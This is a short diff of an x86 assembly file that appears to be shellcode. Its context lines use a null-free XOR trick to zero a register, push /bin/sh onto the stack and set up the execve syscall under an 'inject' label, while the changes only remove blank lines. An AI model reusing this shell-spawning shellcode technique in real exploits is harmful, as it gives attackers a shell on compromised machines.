@@ -56,7 +56,6 @@ start_listing:
     push '____'
     pop eax
     xor eax, '____'
-    
 
     ; Push /bin/sh to the stack
     push '/sh0'
@@ -105,4 +104,3 @@ start_listing:
                 ; al = 00001011
 
 inject:
-
